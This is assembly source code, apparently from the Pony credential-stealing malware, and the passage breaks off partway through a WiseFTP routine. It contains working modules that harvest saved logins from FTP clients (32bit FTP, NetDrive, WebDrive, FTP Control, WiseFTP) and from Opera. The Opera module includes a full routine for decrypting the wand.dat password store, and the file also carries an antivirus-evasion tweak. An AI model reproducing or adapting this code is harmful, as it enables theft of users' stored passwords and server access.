; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; 32bit FTP 11.07.01
; http://www.electrasoft.com/32ftp.htm
; Tested: Version 11.07.01
; Tested: Version 12.05.01
; SFTP: not supported

IFDEF COMPILE_MODULE_32BITFTP

.data
	C32BitFTPIniFile	db	'\32BitFtp.ini',0

.code

Grab32BitFTP proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	win_dir[MAX_PATH+1]: BYTE

	invoke	StreamWriteModuleHeader, stream, MODULE_32BITFTP, 0
	mov	hdr_ofs, eax
	
	invoke	GetWindowsDirectory, addr win_dir, MAX_PATH
	.IF	eax && eax <= MAX_PATH
		invoke	PonyStrCat, addr win_dir, offset C32BitFTPIniFile
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
Grab32BitFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; NetDrive 1.2.0.4
; http://www.netdrive.net/
; Tested: NetDrive 1.3.0.2
; Tested: NetDrive 1.3.2.0
; SFTP: implemented

IFDEF COMPILE_MODULE_NETDRIVE

.data
	CNetDriveIniFile	db	'NDSites.ini',0
	CNetDriveAppDataDir	db	'\NetDrive',0
.code

GrabNetDrive proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_NETDRIVE, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CNetDriveAppDataDir, offset CNetDriveIniFile, ITEMHDR_ID or 0
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabNetDrive endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; WebDrive 9.16 (build 2385) 64-bit
; http://www.webdrive.com/
; Tested: Version 10.0 (build 2508) 32 bit
; Tested: Version 10.0 (build 2521) 64 bit
; Tested: Version 10.1 (build 2567) 32 bit
; SFTP: implemented

IFDEF COMPILE_MODULE_WEBDRIVE

.data
	CWebDrivePassword	db	'PassWord',0
	CWebDriveServer		db	'Url',0
	CWebDriveUser		db	'UserName',0
	CWebDriveDir		db	'RootDirectory',0
	CWebDrivePort		db	'Port',0
	CWebDriveBasePath	db	'Software\South River Technologies\WebDrive\Connections',0
	CWebDriveProtocol	db	'ServerType',0

.code

WebDriveScanReg proc stream, BaseKey, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	dwPassLen: DWORD
	LOCAL	Dir: DWORD
	LOCAL	Port: DWORD
	LOCAL	Protocol: DWORD
	
	invoke	RegOpenKey, BaseKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, BaseKey, S, addr CWebDrivePassword, addr dwPassLen
			mov	Password, eax
			invoke	RegReadValueStr, BaseKey, S, addr CWebDriveServer, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, BaseKey, S, addr CWebDriveUser, NULL
			mov	User, eax 
			invoke	RegReadValueStr, BaseKey, S, addr CWebDriveDir, NULL
			mov	Dir, eax
			invoke	RegReadValueStr, BaseKey, S, addr CWebDrivePort, NULL
			mov	Port, eax
			invoke	RegReadValueStr, BaseKey, S, addr CWebDriveProtocol, NULL
			mov	Protocol, eax
			
			.IF	Password && Host && User
				; export data, type = 0000: Host | User | Pass | Port | Dir
				; export data, type = 0010: Host | User | Pass | Port | Dir | Protocol
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 10h
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteBinaryString, stream, Password, dwPassLen
				invoke	StreamWriteString, stream, Port
				invoke	StreamWriteString, stream, Dir
				invoke	StreamWriteString, stream, Protocol
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, Dir
			invoke	MemFree, Port
			invoke	MemFree, Protocol
			
			; recursively scan subfolders
			invoke	WebDriveScanReg, stream, BaseKey, S			
			invoke	MemFree, S
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
WebDriveScanReg endp

GrabWebDrive proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WEBDRIVE, 0
	mov	hdr_ofs, eax
	
	invoke	WebDriveScanReg, stream, dwCurrentUserKey, offset CWebDriveBasePath
	invoke	WebDriveScanReg, stream, HKEY_LOCAL_MACHINE, offset CWebDriveBasePath
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWebDrive endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTP Control 4.5.0.0
; http://www.ftpcontrol.com/
; Tested: FTP Control 4.5.0.0
; SFTP: not supported

IFDEF COMPILE_MODULE_FTPCONTROL

.data
	CFTPControlInstName	db	'FTP CONTROL',0
	CFTPControlInstPath	db	'FTPCON',0
	CFTPControlPrfFile	db	'.prf',0
	CFTPControlProfilesDir	db	'\Profiles',0

.code

GrabFTPControl proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPCONTROL, 0
	mov	hdr_ofs, eax
	
	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, esi, offset CFTPControlInstPath
		push	eax
		invoke	StrStrI, edi, offset CFTPControlInstName
		pop	edx
		.IF	eax || edx
			invoke	ExtractFilePath, esi
			invoke	PonyStrCatFreeArg1, eax, offset CFTPControlProfilesDir
			push	eax
			invoke	CommonFileScan, stream, eax, offset CFTPControlPrfFile, ITEMHDR_ID or 0
			call	MemFree			
		.ENDIF		
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF	
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPControl endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Opera 6.x - 11.x
; http://www.opera.com/
; Tested: Opera 11.50 (Build 1074)
; Tested: Opera 11.64 (Build 1403)
; Tested: 16.0.1196.73 (Chrome based)
; SFTP: not supported

IFDEF COMPILE_MODULE_OPERA

.data
	lpOperaWandSalt		db	83h, 7Dh, 0FCh, 0Fh, 8Eh, 0B3h, 0E8h, 69h, 73h, 0AFh, 0FFh
	COperaWandSaltLen	equ	11
	IFDEF	GRAB_HTTP
	COperaURI_HTTP		db	'http://',0
	COperaURI_HTTPS		db	'https://',0
	ENDIF
	COperaURI_FTP		db	'ftp://',0
	COperaDir		db	'opera',0
	COperaWandDatFile	db	'wand.dat',0
	db					'_' ; NOD32 FIX
	COperaBaseRegPath	db	'Software\Opera Software',0
	COperaRegValue1		db	'Last Directory3',0
	COperaRegValue2		db	'Last Install Path',0
	COperaShellRegPath	db	'Opera.HTML\shell\open\command',0
	COperaNewAppDataDir	db	'\Opera Software',0

.code

OperaReadVariable proc stream, lpStatusCode, lpdwLen
	LOCAL	dwLen: DWORD
	
	invoke	Stream_SafeReadDWORD, stream, lpStatusCode
	mov	dwLen, eax
	invoke	StreamReadCheck, stream, dwLen
	mov	ecx, lpStatusCode
	.IF	eax && dword ptr[ecx] 
		invoke	MemAlloc, dwLen
		push	eax
		invoke	Stream_SafeReadStream, stream, eax, dwLen, lpStatusCode
		pop	edx
		mov	ecx, lpStatusCode
		.IF	!dword ptr[ecx]
			invoke	MemFree, edx
			sub	eax, eax
		.ELSE
			.IF	lpdwLen
				mov	eax, lpdwLen
				push	dwLen
				pop	dword ptr[eax]
			.ENDIF
			mov	eax, edx
		.ENDIF
	.ELSE
		sub	eax, eax 
	.ENDIF
	ret
OperaReadVariable endp

OperaSkipReadDWORD proc stream, lpStatusCode
	invoke	Stream_SafeReadDWORD, stream, lpStatusCode
	invoke	Stream_SafeReadSkip, stream, eax, lpStatusCode
	ret
OperaSkipReadDWORD endp

OperaDecryptWandPass proc uses esi edi ebx Key, KeyLen, Data, DataLen
	LOCAL	digest1[16]: BYTE
	LOCAL	digest2[16]: BYTE
	LOCAL	des_key[24]: BYTE
	LOCAL	hash_mem: DWORD
	LOCAL	hash_len: DWORD
	
	.IF	!Key || !KeyLen || !Data || !DataLen
		sub	eax, eax
		ret
	.ENDIF
	
	; validate key length
	mov	eax, KeyLen
	and	eax, 7
	.IF	!KeyLen || eax
		sub	eax, eax
		ret
	.ENDIF
	
	; validate data length
	mov	eax, DataLen
	and	eax, 7
	.IF	!DataLen || eax
		sub	eax, eax
		ret
	.ENDIF
	
	sub	ebx, ebx
	
	m2m	hash_len, KeyLen
	add	hash_len, COperaWandSaltLen
	invoke	MemAlloc, hash_len
	
	cld
	mov	hash_mem, eax
	mov	edi, hash_mem
	mov	esi, offset lpOperaWandSalt
	mov	ecx, COperaWandSaltLen
	rep movsb
	mov	esi, Key
	mov	ecx, KeyLen
	rep movsb
	
	invoke	MD5Hash, hash_mem, hash_len, addr digest1
	
	invoke	MemFree, hash_mem
	
	m2m	hash_len, KeyLen
	add	hash_len, 16+COperaWandSaltLen
	invoke	MemAlloc, hash_len
	mov	hash_mem, eax
	
	cld
	mov	hash_mem, eax
	lea	esi, digest1 
	mov	edi, hash_mem
	mov	ecx, 16
	rep movsb
	mov	esi, offset lpOperaWandSalt
	mov	ecx, COperaWandSaltLen
	rep movsb
	mov	esi, Key
	mov	ecx, KeyLen
	rep movsb
	
	invoke	MD5Hash, hash_mem, hash_len, addr digest2
	
	invoke	MemFree, hash_mem
	
	cld
	lea	esi, digest1
	lea	edi, des_key
	mov	ecx, 16
	rep movsb
	lea	esi, digest2
	mov	ecx, 8
	rep movsb
	
	invoke	des3key, addr des_key, 1
	
	mov	esi, Data
	mov	edi, DataLen
	shr	edi, 3
	
	.IF	edi
		; decrypt data
		.WHILE	edi
			invoke	des_cbc, esi, esi, addr digest2[8]
			add	esi, 8
			dec	edi
		.ENDW
		; remove unused trailing bytes
		movzx	eax, byte ptr[esi-1]
		.IF	eax <= 8
			sub	esi, eax
		.ENDIF
		; calculate actual decrypted data length
		sub	esi, Data
		shr	esi, 1 ; count wide chars
		
		; calculate required buffer size for unicode->ansi convertation
		invoke	WideCharToMultiByte, CP_ACP, 0, Data, esi, NULL, NULL, NULL, NULL
		.IF	eax
			push	eax
			invoke	MemAlloc, eax
			mov	ebx, eax
			pop	ecx
			; unicode -> ansi
			invoke	WideCharToMultiByte, CP_ACP, 0, Data, esi, ebx, ecx, NULL, NULL
			.IF	!eax
				invoke	MemFree, ebx
				sub	ebx, ebx
			.ENDIF
		.ENDIF
	.ENDIF
	
	mov	eax, ebx
	ret
OperaDecryptWandPass endp

OperaReadValue proc uses edi ebx stream, lpStatusCode
	LOCAL	Key: DWORD
	LOCAL	Data: DWORD
	LOCAL	KeyLen: DWORD
	LOCAL	DataLen: DWORD
	
	sub	ebx, ebx
	invoke	Stream_SafeReadDWORD, stream, lpStatusCode
	push	eax
	invoke	StreamGetPos, stream
	mov	edi, eax
	pop	eax
	add	edi, eax
	.IF	eax
		invoke	OperaReadVariable, stream, lpStatusCode, addr KeyLen
		mov	Key, eax
		invoke	OperaReadVariable, stream, lpStatusCode, addr DataLen
		mov	Data, eax
		
		; decrypt item
		invoke	OperaDecryptWandPass, Key, KeyLen, Data, DataLen
		mov	ebx, eax
		
		invoke	MemFree, Key
		invoke	MemFree, Data
	.ENDIF
	
	invoke	StreamSeekOffset, stream, edi, OFS_BEGIN
	mov	eax, ebx
	ret
OperaReadValue endp

OperaReadSiteHeader proc stream, cVer, lpStatusCode, lpszSiteName
	.IF	cVer >= 6
		; FlagX
		invoke	Stream_SafeReadDWORD, stream, lpStatusCode
		
		; Hash
		invoke	OperaSkipReadDWORD, stream, lpStatusCode
		
		; TimeZone
		invoke	OperaSkipReadDWORD, stream, lpStatusCode
	.ENDIF
	
	; Site
	invoke	OperaReadValue, stream, lpStatusCode
	mov	edx, lpszSiteName
	mov	dword ptr[edx], eax

	; Submit name
	invoke	OperaSkipReadDWORD, stream, lpStatusCode
	
	.IF	cVer > 3
		; Alt name
		invoke	OperaSkipReadDWORD, stream, lpStatusCode
		
		; Form target
		invoke	OperaSkipReadDWORD, stream, lpStatusCode
	.ENDIF
	
	; Advanced flags
	invoke	Stream_SafeReadSkip, stream, 24, lpStatusCode
	
	; Number of children
	invoke	Stream_SafeReadDWORD, stream, lpStatusCode
	ret
OperaReadSiteHeader endp

OperaReadSiteItem proc stream, lpStatusCode, lpszInputName, lpszInputValue, lpszInputValue2
	invoke	Stream_SafeReadSkip, stream, 1, lpStatusCode
	
	; Input name
	invoke	OperaReadValue, stream, lpStatusCode
	mov	edx, lpszInputName
	mov	dword ptr[edx], eax
	
	; Input normal
	invoke	OperaReadValue, stream, lpStatusCode
	mov	edx, lpszInputValue
	mov	dword ptr[edx], eax

	; Input hidden
	invoke	OperaReadValue, stream, lpStatusCode
	mov	edx, lpszInputValue2
	mov	dword ptr[edx], eax

	ret
OperaReadSiteItem endp

OperaReadSites proc uses esi edi stream, target_stream, cVer, lpdwStatusCode
	LOCAL	szSiteName: DWORD
	LOCAL	lpInputName: DWORD
	LOCAL	lpInputValue: DWORD
	LOCAL	lpInputValue2: DWORD
	IFDEF	GRAB_HTTP
	LOCAL	bWriteUserData: DWORD
	ENDIF

	invoke	Stream_SafeReadSkip, stream, 1, lpdwStatusCode
	
	; site count	
	invoke	Stream_SafeReadDWORD, stream, lpdwStatusCode
	mov	esi, eax
	.WHILE	esi
		mov	eax, lpdwStatusCode
		.IF	!dword ptr[eax]
			.BREAK
		.ENDIF
		
		mov	szSiteName, NULL
		invoke	OperaReadSiteHeader, stream, cVer, lpdwStatusCode, addr szSiteName
		mov	edi, eax
		
		IFDEF	GRAB_HTTP
		.IF	szSiteName
			invoke	StrStrI, szSiteName, offset COperaURI_HTTP
			.IF	!eax
				invoke	StrStrI, szSiteName, offset COperaURI_HTTPS
			.ENDIF
			mov	bWriteUserData, eax
		.ELSE
			mov	bWriteUserData, FALSE
		.ENDIF
		.IF	bWriteUserData
			invoke	StreamWriteDWORD, target_stream, ITEMHDR_ID or 1
			invoke	StreamWriteString, target_stream, szSiteName	
		.ENDIF
		ENDIF
		
		.WHILE	edi
			mov	eax, lpdwStatusCode
			.IF	!dword ptr[eax]
				.BREAK
			.ENDIF
			
			mov	lpInputName, NULL
			mov	lpInputValue, NULL
			mov	lpInputValue2, NULL
			invoke	OperaReadSiteItem, stream, lpdwStatusCode, addr lpInputName, addr lpInputValue, addr lpInputValue2
			
			IFDEF	GRAB_HTTP
			.IF	bWriteUserData && lpInputName && (lpInputValue || lpInputValue2)
				invoke	StreamWriteString, target_stream, lpInputName
				invoke	StreamWriteString, target_stream, lpInputValue
				invoke	StreamWriteString, target_stream, lpInputValue2
			.ENDIF
			ENDIF
			
			invoke	MemFree, lpInputName
			invoke	MemFree, lpInputValue
			invoke	MemFree, lpInputValue2
			 
			dec	edi
		.ENDW
		IFDEF	GRAB_HTTP
		.IF	bWriteUserData
			invoke	StreamWriteDWORD, target_stream, 0
			invoke	StreamWriteDWORD, target_stream, 0
			invoke	StreamWriteDWORD, target_stream, 0
		.ENDIF
		ENDIF	
		invoke	MemFree, szSiteName
		dec	esi
	.ENDW
	ret
OperaReadSites endp

ProcessOperaWandStream proc uses esi stream, target_stream
	LOCAL	cVer: DWORD
	LOCAL	dwStatusCode: DWORD
	LOCAL	dwStreamLen: DWORD
	LOCAL	URL: DWORD
	LOCAL	User: DWORD
	LOCAL	Pass: DWORD
	LOCAL	extra_flag: DWORD

	invoke	StreamGetLength, stream
	mov	dwStreamLen, eax
	
	.IF	dwStreamLen < 16
		mov	eax, TRUE
		ret
	.ENDIF
	
	invoke	StreamGotoBegin, stream
	
	mov	dwStatusCode, TRUE
	invoke	Stream_SafeReadDWORD, stream, addr dwStatusCode
	mov	cVer, eax
	
	; wand.dat version (2 = 6.x, 7.x, 8.x; 3 = 9.0; 4 = 9.1; 5 = 9.12+; 6 = 11.10+)
	.IF	!dwStatusCode || (cVer < 2) || (cVer > 6)
		mov	eax, TRUE
		ret
	.ENDIF	
	
	invoke	Stream_SafeReadDWORD, stream, addr dwStatusCode
	.IF	!dwStatusCode || (eax != 0)
		; master password is set
		mov	eax, TRUE
		ret
	.ENDIF
	
	; Additional unknown data in new versions
	.IF	cVer >= 5
		invoke	Stream_SafeReadSkip, stream, 24, addr dwStatusCode
		invoke	Stream_SafeReadDWORD, stream, addr dwStatusCode
		mov	extra_flag, eax
	.ELSE
		invoke	Stream_SafeReadDWORD, stream, addr dwStatusCode
		mov	extra_flag, eax
		invoke	Stream_SafeReadSkip, stream, 4, addr dwStatusCode
	.ENDIF
	
	; Personal Profile
	invoke	OperaSkipReadDWORD, stream, addr dwStatusCode
	.IF	extra_flag == 1
		invoke	OperaReadSites, stream, target_stream, cVer, addr dwStatusCode
		; Log Profile
		invoke	OperaSkipReadDWORD, stream, addr dwStatusCode
	.ENDIF

	.IF	!dwStatusCode
		mov	eax, FALSE
		ret
	.ENDIF

	; Form passwords
	invoke	OperaReadSites, stream, target_stream, cVer, addr dwStatusCode
	.IF	!dwStatusCode
		mov	eax, FALSE
		ret
	.ENDIF
	
	; http/ftp passwords
	invoke	Stream_SafeReadDWORD, stream, addr dwStatusCode
	mov	esi, eax
	.WHILE	dwStatusCode && esi
		invoke	StreamGetPos, stream
		.IF	eax == dwStreamLen
			.BREAK
		.ENDIF
		
		.IF	cVer >= 6
			invoke	Stream_SafeReadDWORD, stream, addr dwStatusCode
			invoke	OperaSkipReadDWORD, stream, addr dwStatusCode
			invoke	OperaSkipReadDWORD, stream, addr dwStatusCode
		.ENDIF
		
		invoke	OperaReadValue, stream, addr dwStatusCode
		mov	URL, eax
		
		invoke	OperaReadValue, stream, addr dwStatusCode
		mov	User, eax
		
		invoke	OperaReadValue, stream, addr dwStatusCode
		mov	Pass, eax
		
		.IF	URL && User && Pass && dwStatusCode
			invoke	StrStrI, URL, offset COperaURI_FTP
			IFDEF	GRAB_HTTP
			.IF	!eax
				invoke	StrStrI, URL, offset COperaURI_HTTP
				.IF	!eax
					invoke	StrStrI, URL, offset COperaURI_HTTPS
				.ENDIF
			.ENDIF
			ENDIF
			
			.IF	eax
				invoke	StreamWriteDWORD, target_stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, target_stream, URL
				invoke	StreamWriteString, target_stream, User
				invoke	StreamWriteString, target_stream, Pass 
			.ENDIF
		.ENDIF
		
		invoke	MemFree, URL
		invoke	MemFree, User
		invoke	MemFree, Pass
		
		dec	esi
	.ENDW

	mov	eax, dwStatusCode
	ret
ProcessOperaWandStream endp

OperaProcessWandFile proc target_stream, lpFileName
	LOCAL	stream: DWORD
	
	invoke	IsFileAlreadyProcessed, lpFileName
	.IF	!eax
		invoke	StreamCreate, addr stream
		invoke	StreamLoadFromFile, lpFileName, stream
		.IF	eax
			invoke	ProcessOperaWandStream, stream, target_stream
			.IF	!eax
				; Error occured while processing "wand.dat" file
				; Send "wand.dat" file for debugging
				;invoke	CommonAppendFileForceDupe, target_stream, lpFileName, ITEMHDR_ID or 1000h
			.ENDIF
		.ENDIF
		invoke	StreamFree, stream
	.ENDIF
	ret
OperaProcessWandFile endp

OperaWandFileScan proc stream, dir, filemask
	LOCAL	FindFileData: WIN32_FIND_DATA
	LOCAL	hFind: DWORD
	LOCAL	path: DWORD
	LOCAL	ininame: DWORD

	mov	path, 0
	
	mov	eax, dir
	.IF	(!eax) || (!byte ptr[eax])
		jmp	@not_found
	.ENDIF
	
	invoke	CheckEndSlash, dir
	.IF	!eax
		invoke	PonyStrCat, dir, offset CCommonFileMask
	.ELSE
		invoke	PonyStrCat, dir, offset CCommonFileMaskNoSlash
	.ENDIF
	mov	path, eax
	
	invoke	ZeroMemory, addr FindFileData, sizeof WIN32_FIND_DATA

        invoke  FindFirstFile, path, addr FindFileData
        mov     hFind, eax
        inc     eax
        jz      @not_found

@find_loop:
        lea	edx, FindFileData
        test    [edx].WIN32_FIND_DATA.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        .IF	!ZERO?
        	; is directory, scan recursively
        	
        	; skip "." and ".." path names
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	lea	edx, FindFileData
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePPoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	invoke	CheckEndSlash, dir
        	.IF	!eax
			invoke	PonyStrCat, dir, offset szSlash
		.ELSE
			invoke	PonyStrCat, dir, NULL
		.ENDIF
        	lea	edx, FindFileData
		lea	edx, [edx].WIN32_FIND_DATA.cFileName		
		invoke	PonyStrCatFreeArg1, eax, edx
		push	eax
		invoke	OperaWandFileScan, stream, eax, filemask
		call	MemFree
        	
        	jmp	@skip
        .ENDIF

	lea	eax, [edx].WIN32_FIND_DATA.cFileName
	mov	ininame, eax

	
	invoke	StrStrI, ininame, filemask
	.IF	eax
		invoke	PonyStrCat, dir, offset szSlash
		invoke	PonyStrCatFreeArg1, eax, ininame
		push	eax
		invoke	OperaProcessWandFile, stream, eax
		call	MemFree
	.ENDIF

@skip:
        invoke  FindNextFile, hFind, addr FindFileData
       	test    eax, eax
       	jnz     @find_loop
       	
	invoke	FindClose, hFind
	
@not_found:
	
	invoke	MemFree, path

	ret
OperaWandFileScan endp

OperaFindDirs proc stream, dir
	LOCAL	FindFileData: WIN32_FIND_DATA
	LOCAL	hFind: DWORD
	LOCAL	path: DWORD
	LOCAL	file_name: DWORD
	LOCAL	target_dir: DWORD

	mov	path, 0

	mov	eax, dir
	.IF	(!eax) || (!byte ptr[eax])
		jmp	@not_found
	.ENDIF

	invoke	PonyStrCat, dir, offset CCommonFileMask
	mov	path, eax
	
	invoke	ZeroMemory, addr FindFileData, sizeof WIN32_FIND_DATA

        invoke  FindFirstFile, path, addr FindFileData
        mov     hFind, eax
        inc     eax
        jz      @not_found

@find_loop:
        lea	edx, FindFileData
        test    [edx].WIN32_FIND_DATA.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        .IF	!ZERO?
        	; skip "." and ".." paths
        	lea	edx, FindFileData
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	lea	edx, FindFileData
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePPoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	lea	edx, FindFileData
		lea	eax, [edx].WIN32_FIND_DATA.cFileName
		mov	file_name, eax

		invoke	PonyStrCat, dir, offset szSlash
		invoke	PonyStrCatFreeArg1, eax, file_name
		mov	target_dir, eax
		push	eax
		invoke	StrStrI, target_dir, offset COperaDir
		.IF	eax
			invoke	OperaWandFileScan, stream, target_dir, offset COperaWandDatFile
		.ENDIF
		call	MemFree
	.ENDIF
       
@skip:
        invoke  FindNextFile, hFind, addr FindFileData
       	test    eax, eax
       	jnz     @find_loop
       	
	invoke	FindClose, hFind
	
@not_found:
	invoke	MemFree, path

	ret
OperaFindDirs endp

OperaCommonFileScan proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		push	eax
		invoke	OperaFindDirs, stream, eax
		call	MemFree
	.ENDIF
	ret
OperaCommonFileScan endp

ChromeCommonScanCustomID proto :DWORD, :DWORD, :DWORD

GrabOpera proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_OPERA, 0
	mov	hdr_ofs, eax
	
	; Application Data Directories
	invoke	OperaCommonFileScan, stream, CSIDL_APPDATA
	invoke	OperaCommonFileScan, stream, CSIDL_COMMON_APPDATA
	invoke	OperaCommonFileScan, stream, CSIDL_LOCAL_APPDATA
	
	invoke	RegReadValueStr, dwCurrentUserKey, offset COperaBaseRegPath, offset COperaRegValue1, NULL
	.IF	eax
		push	eax
		invoke	OperaWandFileScan, stream, eax, offset COperaWandDatFile
		call	MemFree
	.ENDIF
	
	invoke	RegReadValueStr, dwCurrentUserKey, offset COperaBaseRegPath, offset COperaRegValue2, NULL
	.IF	eax
		push	eax
		invoke	OperaWandFileScan, stream, eax, offset COperaWandDatFile
		call	MemFree
	.ENDIF
	
	invoke	RegReadValueStr, HKEY_CLASSES_ROOT, offset COperaShellRegPath, NULL, NULL
	.IF	eax
		push	eax
		invoke	ExtractFilePath, eax
		.IF	eax
			push	eax
			invoke	OperaWandFileScan, stream, eax, offset COperaWandDatFile
			call	MemFree
		.ENDIF
		call	MemFree
	.ENDIF
	
	invoke	ChromeCommonScanCustomID, stream, offset COperaNewAppDataDir, ITEMHDR_ID or 2

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabOpera endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; WiseFTP 1.x - 7.x
; http://www.wise-ftp.com/
; Tested: 7.0.3
; Tested: 7.0.4
; SFTP: implemented

IFDEF COMPILE_MODULE_WISEFTP

.data
	CWiseFTPBinFileMask	db	'wiseftpsrvs.bin',0
	CWiseFTPAppDataDir	db	'\AceBIT',0
	CWiseFTPRegPath		db	'Software\AceBIT',0
	CWiseFTPRegValue	db	'MRU',0
	CWiseFTP_IniRegPath1	db	'SOFTWARE\Classes\TypeLib\{CB1F2C0F-8094-4AAC-BCF5-41A64E27F777}',0
	CWiseFTP_IniRegPath2	db	'SOFTWARE\Classes\TypeLib\{9EA55529-E122-4757-BC79-E4825F80732C}',0
	CWiseFTPIniFile1	db	'wiseftpsrvs.ini',0
	CWiseFTPIniFile2	db	'wiseftp.ini',0
	 
.code

WiseFTPScanReg proc stream, BaseKey, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	MRU: DWORD
	
	invoke	RegOpenKey, BaseKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, BaseKey, S, addr CWiseFTPRegValue, NULL
			mov	MRU, eax
			
			.IF	MRU
				; MRU string
				invoke	CommonAppendDataStr, stream, MRU, ITEMHDR_ID or 1
			.ENDIF
			
			invoke	MemFree, MRU
			
			; recursively scan subfolders
			invoke	WiseFTPScanReg, stream, BaseKey, S			
			invoke	MemFree, S
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
WiseFTPScanReg endp

WiseFTPScanRegIni proc stream, BaseKey, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Dir: DWORD
	LOCAL	ini_dir: DWORD
	
	invoke	RegOpenKey, BaseKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, BaseKey, S, NULL, NULL
			mov	Dir, eax
			
